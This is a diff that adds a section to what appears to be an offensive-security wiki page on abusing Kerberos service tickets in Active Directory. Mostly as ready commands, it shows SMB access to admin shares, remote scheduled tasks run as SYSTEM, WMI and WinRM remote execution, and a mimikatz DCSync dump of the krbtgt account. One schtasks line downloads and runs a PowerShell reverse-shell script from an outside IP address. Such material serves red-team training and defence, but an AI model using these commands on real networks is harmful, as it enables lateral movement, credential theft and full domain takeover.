@@ -108,3 +108,85 @@ Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
+## Abusing Service tickets
+
+In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+
+### CIFS
+
+With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** \(if they are exposed\) and copy files to ay part of the remote filesystem just doing something like:
+
+```bash
+dir \\vulnerable.computer\C$
+dir \\vulnerable.computer\ADMIN$
+copy afile.txt \\vulnerable.computer\C$\Windows\Temp
+```
+
+You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+
+{% page-ref page="../ntlm/psexec-and-winexec.md" %}
+
+### HOST
+
+With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
+
+```bash
+#Check you have permissions to use schtasks over a remote server
+schtasks /S some.vuln.pc
+#Create scheduled task, first for exe execution, second for powershell reverse shell download
+schtasks /create /S some.vuln.pc /SC weekely /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
+schtasks /create /S some.vuln.pc /SC Weekely /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
+#Check it was successfully created
+schtasks /query /S some.vuln.pc
+#Run created schtask now
+schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
+```
+
+### HOST + RPCSS
+
+With these tickets you can **execute WMI in the victim system**:
+
+```bash
+#Check you have enough privileges
+Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
+#Execute code
+Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
+
+#You can also use wmic
+wmic remote.computer.local list full /format:list 
+```
+
+Find **more information about wmiexec** in the following page:
+
+{% page-ref page="../ntlm/wmicexec.md" %}
+
+### HOST + WSMAN \(WINRM\)
+
+With winrm access over a computer you can **access it** and even get a PowerShell:
+
+```bash
+New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
+```
+
+Check the following page to learn **more ways to connect with a remote host using winrm**:
+
+{% page-ref page="../ntlm/winrm.md" %}
+
+{% hint style="warning" %}
+Note that **winrm must be active and listening** on the remote computer to access it.
+{% endhint %}
+
+### LDAP
+
+With this privilege you can dump the DC database using **DCSync**:
+
+```text
+mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
+```
+
+**Learn more about DCSync** in the following page:
+
+{% page-ref page="dcsync.md" %}
+
+
+
